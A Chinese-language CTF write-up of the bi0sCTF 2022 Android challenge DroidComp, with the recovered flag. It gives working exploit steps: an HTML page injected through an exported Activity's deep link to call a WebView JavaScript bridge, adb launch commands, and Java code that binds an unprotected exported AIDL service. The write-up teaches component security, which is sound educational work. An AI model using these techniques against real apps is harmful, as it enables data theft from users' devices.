# bi0sCTF 2022 DroidComp Writeup

## 题目简述

DroidComp 是一道 Android 组件安全题，flag 被拆成两部分。第一部分要利用导出的 Activity、可控 WebView 地址和 `addJavascriptInterface`；第二部分要复刻目标的 AIDL 接口，绑定导出的远程 Service。两部分最终都会调用 JNI，将包名 `x.y.z` 的 SHA-256 十六进制串作为循环异或密钥解出文本。

题目原本位于 Misc，但核心障碍是 Android 导出组件、WebView JavaScript 桥和 Binder/AIDL 机制，因此归档到 mobile。

## 解题过程

### 审计 Manifest 中的攻击面

`AndroidManifest.xml` 暴露了两个关键组件：

```xml
<service
    android:name=".IService"
    android:exported="true"
    android:process=":remote">
    <intent-filter>
        <action android:name="x.y.z.ServicesOut" />
    </intent-filter>
</service>

<activity
    android:name=".a"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.CUSTOM_INTENT" />
        <data android:host="bi0s" android:scheme="android" />
    </intent-filter>
</activity>
```

Activity `.a` 开启 JavaScript，把对象 `new c(this)` 注册为 `client`，同时从深链参数 `web` 读取待加载地址。代码虽调用了多个 `getAllow...()`，这些只是读取设置，并没有形成校验；真正生效的是 `setAllowFileAccess(true)`。当参数不是标准 URL 但字符串包含 `html` 时，程序仍会直接 `loadUrl(parameters)`。

### 通过 WebView JavaScript 桥取得前半段

桥接类把 JNI 方法暴露给页面：

```java
@JavascriptInterface
public String d() {
    return new h().s("x.y.z");
}
```

在设备共享存储中放置 `pwned.html`：

```html
<html>
  <body>
    <script>
      document.write("Flag: " + client.d());
    </script>
  </body>
</html>
```

然后显式启动导出的 Activity，并令其加载该文件：

```text
adb push pwned.html /sdcard/pwned.html
adb shell am start -n x.y.z/.a -a android.intent.action.CUSTOM_INTENT -d "android://bi0s?web=file:///sdcard/pwned.html"
```

页面运行在目标 WebView 中，可以访问名为 `client` 的 Java 对象。`client.d()` 进入 JNI：程序计算字符串 `x.y.z` 的 SHA-256，以其小写十六进制字符循环异或内置数组，返回：

```text
bi0sCTF{4ndr01d_15
```

### 复刻 AIDL 接口取得后半段

Service 的 `onBind` 返回 `IClass`，而 `IClass` 继承 `r.s.aidlInterface.Stub`：

```aidl
package r.s;

interface aidlInterface {
    String z();
}
```

在自建 exploit 应用中必须使用同一个 AIDL 包名、接口名和方法签名，这样生成的 Binder transaction 才与目标一致。绑定时同时限定 action 和目标包，防止解析到别的服务：

```java
ServiceConnection connection = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder binder) {
        aidlInterface api = aidlInterface.Stub.asInterface(binder);
        try {
            Log.i("DroidComp", api.z());
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) { }
};

Intent intent = new Intent("x.y.z.ServicesOut").setPackage("x.y.z");
bindService(intent, connection, Context.BIND_AUTO_CREATE);
```

导出的 Service 接受外部应用绑定，`z()` 调用 JNI 的另一个数组解密入口 `h.ss("x.y.z")`，得到：

```text
_50_vuln3r4bl3}
```

拼接两部分，最终 flag 为：

```text
bi0sCTF{4ndr01d_15_50_vuln3r4bl3}
```

官方赛后文章给出了 WebView 文件注入和 exploit APK 绑定 AIDL Service 的操作顺序，可用于与仓库源码互证：[DroidComp 官方题解](https://blog.bi0s.in/2023/01/25/Misc/bi0sCTF22-DroidComp/)。

## 方法总结

本题串联了两个独立的 Android IPC 边界。导出的 Activity 不应接受外部可控 URL 后在启用 JavaScript 桥的 WebView 中加载；导出的 Service 也不应在没有权限或调用方校验时返回敏感 Binder 接口。JNI 混淆只隐藏了文本，并没有修复组件授权问题。

分析 APK 时应先从 Manifest 建立组件清单，再沿 Intent、WebView 和 Binder 的真实调用链确认敏感数据如何返回。只做静态异或虽然也能从给出的源码恢复两段文本，却会漏掉题目要求展示的两类 Android 漏洞机制。
